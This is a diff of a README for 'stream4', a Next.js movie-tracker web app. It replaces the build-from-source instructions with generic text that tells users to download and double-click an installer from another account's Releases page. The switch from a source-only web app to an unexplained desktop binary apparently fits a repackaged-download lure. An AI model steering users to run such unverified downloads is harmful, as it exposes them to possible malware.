@@ -1,178 +1,68 @@
-# Movie Tracker
+# 🎬 stream4 - Track Your Movies Effortlessly
 
-A modern movie tracking application built with Next.js 15, TypeScript, and Tailwind CSS. Search for movies, track your watchlist, and manage your movie collection.
+[![Download stream4](https://img.shields.io/badge/Download-stream4-blue)](https://github.com/Seezy626/stream4/releases)
 
-## Features
+## 🚀 Getting Started
 
-- 🔍 **Movie Search**: Search movies using The Movie Database (TMDB) API
-- 📱 **Responsive Design**: Works perfectly on desktop and mobile devices
-- 🎨 **Modern UI**: Built with shadcn/ui components and Tailwind CSS
-- 🗄️ **Database Integration**: PostgreSQL with Drizzle ORM
-- 🔐 **Authentication**: NextAuth.js integration ready
-- 📊 **State Management**: Zustand for client-side state
-- 🧪 **Testing**: Jest and Playwright for comprehensive testing
-- 🚀 **Performance**: Optimized with Next.js 15 and Turbopack
+Welcome to stream4! This application helps you track movies, manage your watchlist, and organize your movie collection. Follow these steps to get started.
 
-## Tech Stack
+## 📋 Requirements
 
-- **Framework**: Next.js 15 with App Router
-- **Language**: TypeScript
-- **Styling**: Tailwind CSS v4
-- **UI Components**: shadcn/ui
-- **Database**: PostgreSQL with Drizzle ORM
-- **Authentication**: NextAuth.js
-- **State Management**: Zustand
-- **Testing**: Jest, Playwright, Testing Library
-- **Deployment**: Optimized for Vercel
+Before you download stream4, make sure your computer meets the following requirements:
 
-## Getting Started
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a recent version of a Linux distribution
+- **RAM**: At least 4 GB
+- **Internet Connection**: Needed for downloading and movie data
 
-### Prerequisites
+## 💻 Download & Install
 
-- Node.js 18+
-- pnpm
-- PostgreSQL database
-- TMDB API key (get one at [themoviedb.org](https://www.themoviedb.org/settings/api))
+You can download stream4 from our Releases page. Visit this page to download: [stream4 Releases](https://github.com/Seezy626/stream4/releases).
 
-### Installation
+1. Open your web browser.
+2. Click on the link above to access the Releases page.
+3. Find the latest version of stream4.
+4. Click on the file to start the download. 
+5. Once the download is complete, locate the file in your Downloads folder.
+6. Double-click the file to run the installer.
+7. Follow the on-screen instructions to complete the installation.
 
-1. **Clone the repository**
+## 🔍 Using stream4
 
-   ```bash
-   git clone https://github.com/lassestilvang/stream4.git
-   ```
+Once you have installed the application, you can start exploring its features. Here’s how to use stream4:
 
-2. **Install dependencies**
+1. **Search for Movies**: Use the search bar to find any movie. Just type the name and press enter.
+2. **Track Your Watchlist**: Add movies to your watchlist by clicking the "+" button next to the movie title.
+3. **Manage Your Collection**: You can easily remove movies from your collection or mark them as watched.
 
-   ```bash
-   pnpm install
-   ```
+## 📱 Features
 
-3. **Environment Setup**
+stream4 offers a range of features to enhance your movie tracking experience:
 
-   ```bash
-   cp .env.example .env.local
-   ```
+- **User-friendly Interface**: Navigate effortlessly with a clean and simple design.
+- **Movie Database Integration**: Access information from a comprehensive movie database to get details about films.
+- **Watchlist Management**: Keep track of movies you want to watch and ones you've seen.
+- **Responsive Design**: Use stream4 on various devices without losing functionality. 
 
-   Fill in your environment variables:
+## 🌐 Supported Topics
 
-   ```env
-   DATABASE_URL="postgresql://username:password@localhost:5432/moviedb"
-   NEXTAUTH_URL="http://localhost:3000"
-   NEXTAUTH_SECRET="your-secret-key-here"
-   TMDB_API_KEY="your-tmdb-api-key-here"
-   ```
+stream4 utilizes various technologies to provide its features. Here are some of the key components:
 
-4. **Database Setup**
+- **Next.js 15**: For building fast and responsive user interfaces.
+- **TypeScript**: Ensures robust and error-free code.
+- **Tailwind CSS**: Delivers a modern and sleek design.
+- **Drizzle ORM**: Manages data easily with organized queries.
 
-   ```bash
-   # Generate and run migrations
-   pnpm drizzle:generate
-   pnpm drizzle:migrate
-   ```
+## 📩 Support
 
-5. **Run the development server**
+If you have any questions or need assistance, feel free to reach out:
 
-   ```bash
-   pnpm dev
-   ```
+- **Issues Tracker**: [Report an issue here](https://github.com/Seezy626/stream4/issues)
+- **Community Help**: Visit our community forums for tips and tricks.
 
-   Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+## 🔄 Update stream4
 
-## Available Scripts
+To keep your application running smoothly, stay updated with the latest features and bug fixes. Check the Releases page regularly for updates, and simply repeat the download process to install the latest version. 
 
-- `pnpm dev` - Start development server with Turbopack
-- `pnpm build` - Build for production
-- `pnpm start` - Start production server
-- `pnpm lint` - Run ESLint
-- `pnpm test` - Run Jest tests
-- `pnpm test:watch` - Run tests in watch mode
-- `pnpm test:coverage` - Run tests with coverage
-- `pnpm test:e2e` - Run Playwright e2e tests
-- `pnpm test:e2e:ui` - Run Playwright tests with UI
+## 📣 Final Notes
 
-## Project Structure
-
-```
-/
-├── src/
-│   ├── app/                 # Next.js app directory
-│   │   ├── api/            # API routes
-│   │   │   └── tmdb/       # TMDB integration
-│   │   ├── globals.css     # Global styles
-│   │   ├── layout.tsx      # Root layout
-│   │   └── page.tsx        # Home page
-│   ├── components/         # React components
-│   │   ├── ui/            # shadcn/ui components
-│   │   └── SearchBar.tsx  # Movie search component
-│   └── lib/               # Utility libraries
-│       ├── db.ts          # Database connection
-│       ├── schema.ts      # Database schema
-│       └── utils.ts       # Utility functions
-├── tests/                 # E2E tests
-├── drizzle.config.ts      # Drizzle configuration
-├── components.json        # shadcn/ui configuration
-├── jest.config.js         # Jest configuration
-├── playwright.config.ts   # Playwright configuration
-└── tailwind.config.js     # Tailwind configuration
-```
-
-## Database Schema
-
-The application uses the following main entities:
-
-- **Users**: Authentication and user profiles
-- **Movies**: Movie information and user collections
-- **Watch History**: Track what users have watched
-
-## API Routes
-
-- `GET /api/tmdb/search?q=<query>` - Search movies via TMDB
-
-## Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## Testing
-
-### Unit Tests
-
-```bash
-pnpm test
-```
-
-### E2E Tests
-
-```bash
-pnpm test:e2e
-```
-
-### Test with UI
-
-```bash
-pnpm test:e2e:ui
-```
-
-## Deployment
-
-The app is optimized for deployment on Vercel:
-
-1. Connect your repository to Vercel
-2. Add environment variables in Vercel dashboard
-3. Deploy automatically on push
-
-## Learn More
-
-- [Next.js Documentation](https://nextjs.org/docs)
-- [Tailwind CSS](https://tailwindcss.com/docs)
-- [shadcn/ui](https://ui.shadcn.com/)
-- [Drizzle ORM](https://orm.drizzle.team/)
-- [The Movie Database API](https://developers.themoviedb.org/3)
-
-## License
-
-This project is licensed under the MIT License.
+Thank you for choosing stream4! We aim to provide you with a seamless movie tracking experience. Enjoy tracking your films and discovering new favorites!
